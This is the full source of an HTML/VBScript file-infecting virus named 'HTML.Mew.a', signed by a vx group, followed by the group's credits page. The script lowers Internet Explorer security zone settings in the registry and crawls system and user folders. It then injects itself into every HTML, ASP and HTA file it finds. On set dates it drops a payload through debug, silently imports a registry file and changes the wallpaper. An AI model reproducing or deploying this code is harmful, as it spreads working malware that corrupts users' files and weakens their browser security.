
 
HTML.Mew.a
<!--Mew-->
<HTML>
<BODY>
<Script Language = "JavaScript">
<!--
	var userAgent=navigator.appName;
	var agentInfo=userAgent.substring(0, 1);
    if(agentInfo == "M"){
}
else {
alert("The page you want to view was designed for Internet Explorer only, \n Please view this page with Internet Explorer")
self.close()
}
//-->
</SCRIPT>
<Script Language = "VBScript">
<!--
On Error Resume Next
'HTML.Mew.a
'By -KD- [Metaphase VX Team & NoMercyVirusTeam]
'Technology used from foxz [NoMercyVirusTeam]
'Part of the HTML Pokemon Family
'This Family goes out to IDT
Set WshShell = CreateObject("WScript.Shell")
WshShell.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
If location.protocol = "file:" then
  Randomize
  Set TRange = document.body.createTextRange()
  HPath = Replace(location.href, "/", "\")
  Set FSO = CreateObject("Scripting.FileSystemObject")
  HPath = Replace(HPath, "file:\\\", "")
  HPath = FSO.GetParentFolderName(HPath)
  Call GetFolder(HPath)
  Call GetFolder("C:\")
  Call GetFolder("C:\My Documents")
  Call GetFolder("C:\Windows")
  Call GetFolder("C:\Windows\System")
  Call GetFolder("C:\Windows\ShellNew")
  Call GetFolder("C:\Windows\Help")
  Call GetFolder("C:\Windows\Temp")
  Call GetFolder("C:\Windows\Web")
  Call GetFolder("C:\Windows\Web\Wallpaper")
  Call GetFolder("C:\Program Files\Microsoft Office\Office\Headers")
  Call GetFolder("C:\Inetpub\wwwroot")
  Call GetFolder("C:\Inetpub\wwwroot\myweb")
  Call GetFolder("C:\Program Files\Internet Explorer\Connection Wizard")
  Call GetFolder("C:\Program Files\Microsoft FrontPage\bin")	
End If
If Day(Now()) = 1 or Day(Now()) = 10 or Day(Now()) = 25  Then
  Set DropMew = FSO.CreateTextFile("c:\Windows\pokemon.dll", 2, False)
  DropMew.WriteLine "n Mew.jpg"
  DropMew.WriteLine "e 0100 ff d8 ff e0 00 10 4a 46 49 46 00 01 01 01 00 48 "
  DropMew.WriteLine "e 0110 00 48 00 00 ff db 00 43 00 0f 0a 0b 0d 0b 09 0f "
  DropMew.WriteLine "e 0120 0d 0c 0d 11 10 0f 11 16 25 18 16 14 14 16 2d 20 "
  DropMew.WriteLine "e 0130 22 1b 25 35 2f 38 37 34 2f 34 33 3b 42 55 48 3b "
  DropMew.WriteLine "e 0140 3f 50 3f 33 34 4a 64 4b 50 57 5a 5f 60 5f 39 47 "
  DropMew.WriteLine "e 0150 68 6f 67 5c 6e 55 5d 5f 5b ff db 00 43 01 10 11 "
  DropMew.WriteLine "e 0160 11 16 13 16 2b 18 18 2b 5b 3d 34 3d 5b 5b 5b 5b "
  DropMew.WriteLine "e 0170 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b "
  DropMew.WriteLine "e 0180 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b "
  DropMew.WriteLine "e 0190 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b ff c0 "
  DropMew.WriteLine "e 01a0 00 11 08 00 37 00 3a 03 01 22 00 02 11 01 03 11 "
  DropMew.WriteLine "e 01b0 01 ff c4 00 1b 00 00 02 02 03 01 00 00 00 00 00 "
  DropMew.WriteLine "e 01c0 00 00 00 00 00 00 00 05 01 06 02 04 07 03 ff c4 "
  DropMew.WriteLine "e 01d0 00 32 10 00 02 01 03 03 02 03 05 07 05 00 00 00 "
  DropMew.WriteLine "e 01e0 00 00 00 01 02 03 00 04 11 05 12 21 06 13 31 41 "
  DropMew.WriteLine "e 01f0 51 07 14 61 81 91 22 23 32 33 43 71 d1 42 52 a1 "
  DropMew.WriteLine "e 0200 b1 f1 ff c4 00 16 01 01 01 01 00 00 00 00 00 00 "
  DropMew.WriteLine "e 0210 00 00 00 00 00 00 00 00 01 02 ff c4 00 1b 11 01 "
  DropMew.WriteLine "e 0220 01 00 02 03 01 00 00 00 00 00 00 00 00 00 00 00 "
  DropMew.WriteLine "e 0230 01 11 31 02 03 12 21 ff da 00 0c 03 01 00 02 11 "
  DropMew.WriteLine "e 0240 03 11 00 3f 00 e7 be b4 55 c7 54 e9 1b 59 e2 f7 "
  DropMew.WriteLine "e 0250 8d 0a e7 7f 19 30 48 dc fc 8f f3 55 19 a1 92 09 "
  DropMew.WriteLine "e 0260 5a 39 91 91 d4 e0 ab 0c 11 4c 35 65 8c 2b 62 c2 "
  DropMew.WriteLine "e 0270 ce 4b fb c8 ad a2 65 57 91 b6 82 e7 00 56 bd 7a "
  DropMew.WriteLine "e 0280 da bb c7 75 13 c6 db 5d 5c 10 de 87 34 65 60 4e "
  DropMew.WriteLine "e 0290 82 d7 5e e4 44 20 8f 69 fd 5e e0 db fc ff 00 8a "
  DropMew.WriteLine "e 02a0 d8 9f d9 ce b7 1a 16 46 b7 94 81 f8 55 c8 27 ea "
  DropMew.WriteLine "e 02b0 2a ee b7 17 37 56 91 25 9c e5 24 0c a5 8a ff 00 "
  DropMew.WriteLine "e 02c0 50 f3 14 ed de 44 b6 de 46 5c 2e 71 4c 0e 11 7d "
  DropMew.WriteLine "e 02d0 61 75 a7 dc b5 bd e4 0f 0c ab e2 ac 2b c3 18 3e "
  DropMew.WriteLine "e 02e0 5f 5a ea 9a 9e b5 24 3a 74 d7 37 d0 c7 be 32 42 "
  DropMew.WriteLine "e 02f0 80 bc 91 9e 33 e3 5c d2 6d 42 69 66 79 08 41 bd "
  DropMew.WriteLine "e 0300 8b 60 28 e3 34 11 6d 7f 75 68 d9 86 66 5f 86 78 "
  DropMew.WriteLine "e 0310 a6 3e f0 35 c8 bb 53 e0 5d a8 cc 6f fd df 0a 4a "
  DropMew.WriteLine "e 0320 7c 6b 28 a4 68 a5 59 10 e1 94 e4 1a b2 b5 ea cf "
  DropMew.WriteLine "e 0330 8c 48 20 90 78 22 8c f3 9a 63 ab db 8f b9 be 8c "
  DropMew.WriteLine "e 0340 7d dd da ef e3 c0 30 e1 87 d7 fd d2 ea 8c ae fd "
  DropMew.WriteLine "e 0350 3d 2e b5 ef 42 16 81 90 88 c3 f7 0f e1 20 f8 55 "
  DropMew.WriteLine "e 0360 82 4b bd 6a 38 9d 8c 7b 95 06 4e d6 c9 a5 7e cd "
  DropMew.WriteLine "e 0370 1e f2 eb de 3b ac 5a da 30 15 73 eb ff 00 2a f5 "
  DropMew.WriteLine "e 0380 3c 41 20 76 41 c8 19 a2 c7 21 d7 75 e6 bf 8d e1 "
  DropMew.WriteLine "e 0390 1b b2 c7 ed 64 62 90 53 9d 67 5a 5d 4b ba 26 b1 "
  DropMew.WriteLine "e 03a0 85 2e 37 fe 6a 0c 37 07 ce 93 51 12 6a 28 f3 a2 "
  DropMew.WriteLine "e 03b0 81 ce 8b 77 6b 35 b4 9a 56 a4 c1 2d e5 3b a2 9b "
  DropMew.WriteLine "e 03c0 1f 93 27 af ec 7c ea 23 d0 a7 b6 d6 ed ad 6f 54 "
  DropMew.WriteLine "e 03d0 08 a4 70 44 8a 72 8e bf 03 49 e9 8d 96 bb a8 59 "
  DropMew.WriteLine "e 03e0 41 d8 8a 72 61 1f a6 dc 81 fb 7a 50 76 cb 2e d2 "
  DropMew.WriteLine "e 03f0 5a 22 c2 8a 8a a3 85 51 81 59 3c f1 f6 ce 5b ca "
  DropMew.WriteLine "e 0400 a9 7d 37 d5 51 5c 62 07 93 6b 32 f9 f9 56 fe a6 "
  DropMew.WriteLine "e 0410 2f 2d a2 33 c7 20 9e 12 33 95 e0 8f 95 56 b6 ae "
  DropMew.WriteLine "e 0420 75 07 45 82 0d f6 9f 30 db 24 a4 3a 48 7c 33 ce "
  DropMew.WriteLine "e 0430 41 f4 ad 51 d3 7a 5a 80 1e e6 52 c3 82 43 01 cd "
  DropMew.WriteLine "e 0440 4e ab d4 8d 1c 6b 6d bf b8 54 93 b5 4f 00 d5 6d "
  DropMew.WriteLine "e 0450 b5 09 99 8b 71 c9 cd 44 6a 9f 1a 28 a2 85 14 51 "
  DropMew.WriteLine "e 0460 45 11 94 72 3c 6e 19 18 ab 0f 02 0d 59 f4 5e a1 "
  DropMew.WriteLine "e 0470 9e 6b 59 ac ae 9c 90 c8 76 b7 ca 8a 2a cd b7 d7 "
  DropMew.WriteLine "e 0480 71 ca 2a e7 c4 d4 51 45 46 1f ff d9 "
  DropMew.WriteLine "RCX"
  DropMew.WriteLine "038c"
  DropMew.WriteLine "W"
  DropMew.WriteLine "Q"
  DropMew.Close
  Set MyBat = FSO.CreateTextFile("c:\Windows\WinStart.bat", 2, False)
  MyBat.WriteLine ""
  MyBat.WriteLine "@echo off"
  MyBat.WriteLine "debug < c:\Windows\pokemon.dll > nul"
  MyBat.WriteLine ""
  MyBat.Close
  Set MyReg = FSO.CreateTextFile("c:\Windows\pokemon.reg", 2, False)
  MyReg.WriteLine "REGEDIT4"
  MyReg.WriteLine ""
  MyReg.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer]"
  MyReg.WriteLine chr(34) & "ShellState" & chr(34) & "=hex:1c,00,00,00,e3,08,00,00,00,00,00,00,00,00,00,00,00,00,00,00,01,00,00,00,0a,00,00,00"
  MyReg.WriteLine ""
  WshShell.Run("regedit /s c:\Windows\pokemon.reg"), VbHide
  WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General\Wallpaper", "C:\Windows\Mew.jpg" 
  WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General\BackupWallpaper", "C:\Windows\Mew.jpg" 
  WshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\desktop\TileWallpaper", "1"
  WshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\desktop\Wallpaper", "C:\Windows\Mew.jpg" 
End If
Sub GetFolder(InfPath)
On Error Resume Next
Randomize
If FSO.FolderExists(InfPath) Then
  Do
  Set FolderObj = FSO.GetFolder(InfPath)
  InfPath = FSO.GetParentFolderName(InfPath)
  Set FO = FolderObj.Files
  For each NewFile in FO
  ExtName = Lcase(FSO.GetExtensionName(NewFile.Name))
  If ExtName = "htt" Or ExtName = "asp" Or ExtName = "htm" Or ExtName = "hta" _
 Or ExtName = "htx" Or ExtName = "html" Then
    Set MyMew = FSO.GetFile(NewFile.path)
    Set Mew = MyMew.OpenAsTextStream(1)
    MewCheck = Mew.readline
    Mew.close()
      If MewCheck <> "<!--Mew-->" then
      InfectFile NewFile.path
      End If
  End If
  Next
  Loop While FolderObj.IsRootFolder = False
End If
End Sub

Sub InfectFile(GetFileName)
On Error Resue Next
Randomize
Set MyMew = FSO.GetFile(GetFileName)
Set Mew = MyMew.OpenAsTextStream(1)
FileContents = Mew.ReadAll()
Mew.Close
Set MyMew = FSO.GetFile(GetFileName)
Set Mew = MyMew.OpenAsTextStream(2)
Mew.WriteLine "<!--Mew-->"
Mew.WriteLine "<html><body>"
Mew.WriteLine(TRange.htmlText)
Mew.Write("</body></html>" + Chr(13) + Chr(10))
Mew.Write FileContents
Mew.Close
End Sub
-->
</SCRIPT>
</BODY>
</HTML>
<HTML>
<HEAD>
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=windows-1252">
<TITLE>Metaphase VX Team</TITLE>
<STYLE TYPE="text/css">
.namelist {
	font-family : Times New Roman;
	color		: #ffffe0;
	font-size	: 18;
};
.thx {
	color		: #ffffe0;
	font-size	: 24;
	text-align	: center;
}
</STYLE>

<SCRIPT LANGUAGE=JavaScript>
var names = new Array (
'Knowdeth','Knowdeth',
'Sinixstar','Sinixstar',
'Demonphreak_','Demonphreak_',
'Sblip','Sblip',
'Raven','Raven',
'nucleii','nucleii',
'jackie','jackie',
'Evul','Evul',
'MetalKid','MetalKid',
'VxFaerie','VxFaerie',
'Lys Kovick','Lys Kovick',
'','',
'','',
'','',
'','',
'','',
'Specal Thanks To All The Beta Testers','BETA',
'and many many more...','',
'<BR><BR><BR>Welcome To<BR>A Member Of<BR>The<BR>HTML Pokemon<BR>Family<BR>By -KD-<BR>Metaphase <BR>&<BR> NoMercy<BR><BR>2000<BR>','thx0'
);

var namesIndex = 0;
var namesIndexOrg;

var pics = new Array (
	'c_place.jpg',	'1',
	'bld27.jpg',	'2',
	'brick.jpg',	'1',
	'welcome.jpg',	'2',
	'bld1678.jpg',	'1',
	'cd.jpg',		'2',
	'emp1.jpg',		'1',
	'emp3.jpg',		'2',
	'rtm1.jpg',		'1',
	'bus.jpg',		'2',
	'c_bike.jpg',	'3',
	'c_ftn1.jpg',	'1',
	'c_ftn3.jpg',	'2',
	'c_ftn4.jpg',	'1',
	'c_bird3.jpg',	'2',
	'c_bird2.jpg',	'3',
	'c_lake1.jpg',	'1',
	'c_lake2.jpg',	'2',
	'c_cafe.jpg',	'3',
	'c_recep.jpg',	'1',
	'c_sport.jpg',	'2',
	'hammer2.jpg',	'1',
	'piers.jpg',	'2',
	'kingdom.jpg',	'1',
	'needle.jpg',	'3',
	'sea-bld1.jpg',	'1',
	'sea-bld3.jpg',	'2',
	'train.jpg',	'1',
	'water2.jpg',	'3',
	'water1.jpg',	'1',
	'market.jpg',	'2'
);

var picsIndex = 0;

var creditsTimeout = 5500;
var picsTimeout = 2000;
var stopTimeout = 5000;

var nameCount = 21;
var nameX = document.all.name1;
var nameP = document.all.name2;

function showNames() {
	var nString = "";
	var i, j = names.length;
	var bEof = false;

	namesIndexOrg = -1;
	if (namefind.innerText != "") {
		for (i = 1; i < j; i += 2) {
			if (names[i] == namefind.innerText) {
				namesIndexOrg = namesIndex;
				namesIndex = i - 1;
				break;
			}
		}
	}

	for (i = 0; i < nameCount && namesIndex < j; 
				i++, namesIndex += 2) {
		if (names[namesIndex + 1] == 'thx0') {
			if (i)
				break;
			else
				bEof = true;
		}
		nString = nString + names[namesIndex] + "<BR>";
	}

	if (nameX == document.all.name2) {
		nameX = document.all.name1;
		nameP = document.all.name2;
	} else {
		nameX = document.all.name2;
		nameP = document.all.name1;
	}

	ShowHideObj(nameP, 0, 1);
	if (bEof)
		nameX = document.all.thxtext;
	nameX.innerHTML = nString;
	ShowHideObj(nameX, 1, 1);

	// restore the original index, if name jumped
	if (namesIndexOrg != -1) {
		namesIndex = namesIndexOrg;
		namefind.innerText = "";
	}		

	return (namesIndex < j);
};


function ShowHideObj(obj, bShowHide, bApply)
{
	var vis;

	vis = bShowHide == 1 ? "visible" : "hidden";

	if (screen.colorDepth >= 24)
		obj.style.visibility = vis;
	else {
		if (bApply == 1)
			obj.filters(0).apply();
		obj.style.visibility = vis;
		obj.filters(0).play();
	}
}

var imgX = document.all.img1;
var imgP = document.all.img2;
var prevImgType = '2';

function ShowPic() 
{
	switch (pics[picsIndex + 1]) {
	case '1':
		imgX = document.all.img1;
		break;
	case '2':
		imgX = document.all.img2;
		break;
	case '3':
		imgX = document.all.img3;
		break;
	}
	
	switch (prevImgType) {
	case '1':
		imgP = document.all.img1;
		break;
	case '2':
		imgP = document.all.img2;
		break;
	case '3':
		imgP = document.all.img3;
		break;
	}
	
	if (pics[picsIndex + 1] == '3') {
		ShowHideObj(frmLandscape, 0, 1);
		ShowHideObj(frmPortrait, 1, 1);
	}
	if (prevImgType == '3') {
		ShowHideObj(frmPortrait, 0, 1);
		ShowHideObj(frmLandscape, 1, 0);
	}

	prevImgType = pics[picsIndex + 1];
	
	ShowHideObj(imgP, 0, 1);
	imgX.innerHTML = "<IMG SRC=res://membg.dll/" + pics[picsIndex] + ">";
	ShowHideObj(imgX, 1, 1);
		
	picsIndex += 2;

	if (picsIndex >= pics.length)
		picsIndex = 0;
}


var bFullStop = false;

function credits()
{
	if (initxt.innerHTML != '') {
		initxt.innerHTML = '';
		ShowHideObj(initxt, 0, 1);
	}

	if (showNames())
		window.tm = setTimeout('credits();', creditsTimeout);
	else 
		window.tm = setTimeout('StopShow();', stopTimeout);
}


function StopShow()
{
	bFullStop = true;
	window.tm = setTimeout('closeProc();', 1);
}


function ShowImages() 
{
	if (frmLandscape.style.visibility == "hidden") 
		ShowHideObj(frmLandscape, 1, 1);

	ShowPic();

	if (bFullStop == false || (picsIndex < 1 || picsIndex > 4))
		window.tm = setTimeout('ShowImages();', picsTimeout);
}


function ShowNameImg()
{
	ShowHideObj(imgBkg, 1, 1);
	ShowHideObj(crd, 1, 1);

	document.all.initxt.innerHTML = 'The Metaphase VX Team<BR><BR>This list represents but a portion<BR>of the key people. through out the years.<BR><BR><BR><BR><BR><B>From Old School To New</B>'

	ShowHideObj(initxt, 1, 1);

	window.tm = setTimeout('ShowImages();', picsTimeout);
	window.tm = setTimeout('credits();', 8000);
}


function intro() 
{
	if (ShowNum())
		window.tm = setTimeout('intro();', 100);
	else {
		winnum.style.visibility = "hidden";
		ShowNameImg();
	}
}

var WinVerList = new Array (
	'��',
	'��',
	'��',
	'��',
	'��',
	'��',
	'��',
	'��',
	'��',
	'��',
	'��',
	'��',
	'��'
);

var numIdx = 0;

function ShowNum() 
{
//useless section
};

</SCRIPT>

<script language=vbs>
dim strEmp : strEmp = ""
Sub keydownx()
	keyCode = window.event.keycode
	
	select case keyCode
	case 13
		namefind.innerText = strEmp
		strEmp = ""
	case 27
		strEmp = ""
	case else
		if (keyCode <= 255 AND keyCode >= 32) then
			strEmp = strEmp & chr(keyCode)
		end if
	end select
End sub

Sub closeProc()
	ON ERROR RESUME NEXT
End Sub
</script>

</HEAD>

<BODY BGCOLOR="#000000" ONLOAD="intro()" ONKEYDOWN="keydownx()">

<IMG id=imgBkg SRC="res://membg.dll/backgnd.gif" ALIGN="CENTER" VALIGN="CENTER" 
style="position:absolute; left:0; top:0; 
filter:revealTrans(duration=2.0,transition=7; z-index:1; visibility:hidden">

<DIV ID=name1 class="namelist" ALIGN=LEFT VALIGN=TOP
style="position:absolute; left:83; top:22; z-index:90;
filter:blendTrans(duration=0.8); visibility:hidden">
</DIV>

<DIV ID=name2 class="namelist" ALIGN=LEFT VALIGN=TOP
style="position:absolute; left:83; top:22; z-index:90;
filter:blendTrans(duration=0.8); visibility:hidden">
</DIV>

<DIV ID=thxtext class="thx" VALIGN=TOP
style="position:absolute; left:83; top:22; z-index:90; width:180;
filter:blendTrans(duration=0.8); visibility:hidden">
</DIV>

<DIV ID=initxt class="thx" VALIGN=TOP
style="position:absolute; left:78; top:22; z-index:90; width:240; font-size:18;
filter:blendTrans(duration=0.8); visibility:hidden">
</DIV>

<IMG id=frmLandscape SRC="res://membg.dll/frame0.jpg" 
style="position:absolute; left:330;top:49; z-index:90;
filter:blendTrans(duration=0.50); visibility:hidden">

<IMG id=frmPortrait SRC="res://membg.dll/frame1.jpg" 
style="position:absolute; left:339;top:38; z-index:90;
filter:blendTrans(duration=0.50); visibility:hidden">

<IMG id=logo SRC="res://membg.dll/logo.gif" 
style="position:absolute; left:278;top:370; z-index:90;
filter:blendTrans(duration=2.00); visibility:hidden">

<IMG id=crd SRC="res://membg.dll/credit.gif" 
style="position:absolute; left:22;top:22; z-index:90;
filter:revealTrans(duration=1.0,transition=5); visibility:hidden">

<DIV id=img1
style="position:absolute; left:344;top:65; z-index:90;
filter:blendTrans(duration=1.00); visibility:hidden">
</DIV>

<DIV id=img2
style="position:absolute; left:344;top:65; z-index:90;
filter:blendTrans(duration=1.00); visibility:hidden">
</DIV>

<DIV id=img3
style="position:absolute; left:358;top:61; z-index:90;
filter:blendTrans(duration=1.00); visibility:hidden">
</DIV>

<DIV ID=namefind></DIV>	

<DIV id=winnum ALIGN="CENTER" style="position:absolute; left:20;top:100; 
font-family:wingdings; font-size:180; font-weight:bold; color:#0000ff;	
visibility=hidden"></DIV>

<OBJECT id="discwav" style = "visibility:hidden"
	classid="CLSID:05589FA1-C356-11CE-BF01-00AA0055595A">
	<PARAM NAME="ShowDisplay" VALUE="-1">
	<PARAM NAME="AutoStart" VALUE="1">
	<PARAM NAME="AutoRewind" VALUE="1">
	<PARAM NAME="PlayCount" VALUE="8">
	<PARAM NAME="FileName" VALUE="C:\WINDOWS\Application Data\Microsoft\WELCOME\welcom98.wav">

</OBJECT>
</BODY>
</HTML>

